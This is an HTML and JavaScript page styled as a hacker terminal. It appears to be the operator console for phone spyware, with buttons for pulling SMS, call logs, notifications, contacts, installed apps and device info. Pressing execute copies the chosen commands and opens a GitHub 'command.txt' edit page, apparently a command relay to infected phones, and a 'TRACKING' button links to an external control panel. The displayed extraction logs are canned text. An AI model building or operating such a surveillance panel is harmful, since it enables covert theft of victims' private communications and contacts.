<!DOCTYPE html> 
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>RKP ROOT ACCESS</title>
  <link rel="stylesheet" href="styles.css">

<link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Orbitron:wght@400;700&display=swap" rel="stylesheet">

<style>
*{margin:0;padding:0;box-sizing:border-box;}

html,body{height:100%;}

body{
background:#05070d;
font-family:'Share Tech Mono', monospace;
color:#00ffcc;
overflow-x:hidden;
display:flex;
align-items:center;
justify-content:center;
padding:40px;
}

body::before{
content:'';
position:fixed;
top:0;
left:0;
width:100%;
height:100%;
background:
linear-gradient(#00ffcc22 1px, transparent 1px),
linear-gradient(90deg,#00ffcc22 1px, transparent 1px);
background-size:40px 40px;
animation:gridMove 20s linear infinite;
z-index:0;
}

@keyframes gridMove{
from{background-position:0 0;}
to{background-position:40px 40px;}
}

canvas{
position:fixed;
top:0;
left:0;
z-index:1;
pointer-events:none;
}

.terminal{
position:relative;
z-index:5;
width:100%;
max-width:1600px;
padding:40px;
background:rgba(10,10,20,0.85);
border-radius:15px;
border:1px solid #00ffcc;
box-shadow:
0 0 40px #00ffcc55,
inset 0 0 40px #00ffcc22;
backdrop-filter:blur(15px);
}

.header{
display:flex;
justify-content:space-between;
align-items:center;
margin-bottom:25px;
}

.title{
font-family:'Orbitron', sans-serif;
font-size:2em;
color:#00ffcc;
animation:glitch 2s infinite;
}

@keyframes glitch{
0%{text-shadow:2px 2px red,-2px -2px blue;}
20%{text-shadow:-2px -2px red,2px 2px blue;}
40%{text-shadow:2px -2px red,-2px 2px blue;}
60%{text-shadow:-2px 2px red,2px -2px blue;}
80%{text-shadow:0 0 10px #00ffcc;}
100%{text-shadow:2px 2px red,-2px -2px blue;}
}

.contact-btn{
padding:8px 18px;
border:1px solid #ff00ff;
background:transparent;
color:#ff00ff;
cursor:pointer;
transition:0.3s;
box-shadow:0 0 15px #ff00ff;
}
.contact-btn:hover{
background:#ff00ff;
color:#000;
}

.commands{
display:grid;
grid-template-columns:repeat(4, 1fr);
gap:25px;
}

.command{
padding:22px;
font-size:1.05em;
text-align:center;
border:1px solid #003333;
background:#0a1418;
cursor:pointer;
transition:0.3s;
border-radius:8px;
}

.command:hover{
border-color:#00ffff;
box-shadow:0 0 15px #00ffff;
transform:translateY(-3px);
}

.command.selected{
background:#00ffff;
color:#000;
box-shadow:0 0 25px #00ffff;
}

.output{
margin-top:35px;
padding:20px;
background:#000;
border:1px solid #00ffcc;
height:160px;
border-radius:8px;
font-size:1em;
overflow-y:auto;
white-space:pre-wrap;
}

.run-panel{
text-align:center;
margin-top:30px;
display:none;
}

.run-btn{
padding:14px 50px;
border:1px solid #00ff00;
background:transparent;
color:#00ff00;
cursor:pointer;
transition:0.3s;
box-shadow:0 0 20px #00ff00;
}
.run-btn:hover{
background:#00ff00;
color:#000;
}
</style>
</head>
<body>

<canvas id="matrix"></canvas>

<div class="terminal">

<div class="header">
<div class="title">ROOT ACCESS :: RKP EXECUTOR</div>
<button class="contact-btn"
onclick="window.open('https://rahulpuri.fun/RKP-ControlPanel/Tracking/','_blank')">
TRACKING
</button>
</div>

<div class="commands">
<div class="command" data-cmd="sms full">üí¨ sms full</div>
<div class="command" data-cmd="sms 1d">üí¨ sms 1d</div>
<div class="command" data-cmd="sms 7d">üí¨ sms 7d</div>
<div class="command" data-cmd="sms 30d">üí¨ sms 30d</div>

<div class="command" data-cmd="calls full">üìû calls full</div>
<div class="command" data-cmd="calls 1d">üìû calls 1d</div>
<div class="command" data-cmd="calls 7d">üìû calls 7d</div>
<div class="command" data-cmd="calls 30d">üìû calls 30d</div>

<div class="command" data-cmd="notification full">üîî notification full</div>
<div class="command" data-cmd="notification 1d">üîî notification 1d</div>
<div class="command" data-cmd="notification 7d">üîî notification 7d</div>
<div class="command" data-cmd="notification 30d">üîî notification 30d</div>

<div class="command" data-cmd="deviceinfo">‚ÑπÔ∏è deviceinfo</div>
<div class="command" data-cmd="apps full">üì± apps full</div>
<div class="command" data-cmd="contacts full">üë§ contacts full</div>
<div class="command" data-cmd="none">üö´ none</div>
</div>

<div class="output" id="output"></div>

<div class="run-panel" id="runPanel">
<button class="run-btn" onclick="runSelected()">EXECUTE SEQUENCE</button>
</div>

</div>

<script>

// MATRIX unchanged
const canvas=document.getElementById('matrix');
const ctx=canvas.getContext('2d');
let fontSize=14,columns,drops;
const chars="01„Ç¢„Ç´„Çµ„Çø„Éä„Éè„Éû„É§„É©„ÉØ";

function init(){
canvas.width=window.innerWidth;
canvas.height=window.innerHeight;
columns=Math.floor(canvas.width/fontSize);
drops=Array(columns).fill(1);
}

function draw(){
ctx.fillStyle='rgba(0,0,0,0.05)';
ctx.fillRect(0,0,canvas.width,canvas.height);
ctx.fillStyle='#00ffcc';
ctx.font=fontSize+"px monospace";

for(let i=0;i<drops.length;i++){
const text=chars[Math.floor(Math.random()*chars.length)];
ctx.fillText(text,i*fontSize,drops[i]*fontSize);

if(drops[i]*fontSize>canvas.height && Math.random()>0.975){
drops[i]=0;
}

drops[i]++;
}
}

init();
setInterval(draw,50);



// TERMINAL ENGINE ORIGINAL + COPY + REDIRECT + BUTTON STATE CONTROL

const output=document.getElementById("output");
const commands=document.querySelectorAll(".command");
const runPanel=document.getElementById("runPanel");

let selected=new Set();
let alreadyExecuted=new Set();
let queue=[];
let typing=false;

const TYPE_SPEED=6;


// YOUR ORIGINAL REDIRECT URL RESTORED
const redirectURL="https://github.com/MOFO-UG/ControlTheWorld/edit/main/command.txt";



const logDB={

sms:[
"[+] Locating SMS database...",
"[+] Decrypting SMS storage...",
"[+] Extracting SMS records...",
"[+] SMS extraction complete"
],

calls:[
"[+] Accessing CALL interface...",
"[+] Reading CALL logs...",
"[+] Decrypting CALL history...",
"[+] CALL extraction complete"
],

notification:[
"[+] Accessing NOTIFICATION service...",
"[+] Reading NOTIFICATION buffer...",
"[+] Decrypting NOTIFICATION payload...",
"[+] NOTIFICATION capture complete"
],

apps:[
"[+] Scanning installed APPS...",
"[+] Reading APP registry...",
"[+] Extracting APP metadata...",
"[+] APP scan complete"
],

contacts:[
"[+] Accessing CONTACT database...",
"[+] Decrypting CONTACT storage...",
"[+] Extracting CONTACT records...",
"[+] CONTACT extraction complete"
],

deviceinfo:[
"[+] Reading DEVICE kernel...",
"[+] Extracting DEVICE fingerprint...",
"[+] Mapping DEVICE hardware...",
"[+] DEVICE scan complete"
],

none:[
"[+] Null sequence initialized...",
"[+] Kernel sync complete"
]

};



// BUTTON VISIBILITY CONTROLLER (NEW FEATURE, DOES NOT REMOVE OLD LOGIC)

function updateExecuteButton(){

if(typing){

runPanel.style.display="none";

}else{

runPanel.style.display=selected.size?"block":"none";

}

}



function getBase(cmd){

if(cmd.startsWith("sms"))return"sms";
if(cmd.startsWith("calls"))return"calls";
if(cmd.startsWith("notification"))return"notification";
if(cmd.startsWith("apps"))return"apps";
if(cmd.startsWith("contacts"))return"contacts";
if(cmd.startsWith("deviceinfo"))return"deviceinfo";

return"none";

}



function typeNext(){

// WHEN QUEUE EMPTY ‚Üí ANIMATION FINISHED

if(queue.length===0){

typing=false;

updateExecuteButton(); // SHOW BUTTON AGAIN

return;

}

typing=true;

updateExecuteButton(); // HIDE BUTTON DURING TYPING


let text=queue.shift();

let line=document.createElement("div");

output.appendChild(line);

let i=0;

function type(){

if(i<text.length){

line.textContent+=text[i++];

output.scrollTop=output.scrollHeight;

setTimeout(type,TYPE_SPEED);

}else{

typeNext();

}

}

type();

}



function addLogsForCommand(cmd){

if(alreadyExecuted.has(cmd))return;

alreadyExecuted.add(cmd);

let base=getBase(cmd);

logDB[base].forEach(log=>queue.push(log));

if(!typing) typeNext();

}



commands.forEach(btn=>{

btn.onclick=()=>{

let cmd=btn.dataset.cmd;

if(selected.has(cmd)){

selected.delete(cmd);

btn.classList.remove("selected");

}else{

selected.add(cmd);

btn.classList.add("selected");

addLogsForCommand(cmd);

}

// PRESERVE OLD LOGIC + ADD NEW BUTTON CONTROL

updateExecuteButton();

};

});




// FULLY RESTORED ORIGINAL COPY + REDIRECT LOGIC

function runSelected(){

if(selected.size===0)return;

const outputText=[...selected].join(", ");

// COPY TO CLIPBOARD (ORIGINAL)

navigator.clipboard.writeText(outputText).then(()=>{

// SHOW EXECUTING MESSAGE IN TERMINAL

queue.push("root@RKPexecutor:~# executing root sequence...");

// START TYPING IF NOT ACTIVE

if(!typing) typeNext();

// REDIRECT AFTER DELAY (ORIGINAL BEHAVIOR)

setTimeout(()=>{

window.open(redirectURL,'_blank');

},1000);

});

}



// INITIAL TERMINAL PROMPT

queue.push("root@RKPexecutor:~# _");

typeNext();


</script>

</body>
</html>
